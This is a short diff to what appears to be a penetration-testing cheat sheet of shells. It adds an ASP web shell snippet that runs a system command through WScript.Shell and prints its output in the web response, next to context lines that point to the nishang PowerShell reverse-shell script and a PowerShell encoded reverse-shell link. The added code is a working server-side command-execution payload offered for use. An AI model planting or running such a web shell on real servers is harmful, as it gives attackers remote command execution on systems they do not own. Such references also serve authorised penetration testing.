@@ -6,6 +6,17 @@
 # most common: /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
 ```
 
+## ASP
+
+```aspnet
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("whoami")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+```
+
 ## [Powershell encoded revshell](https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58)
 
 ## Powershell one-liners
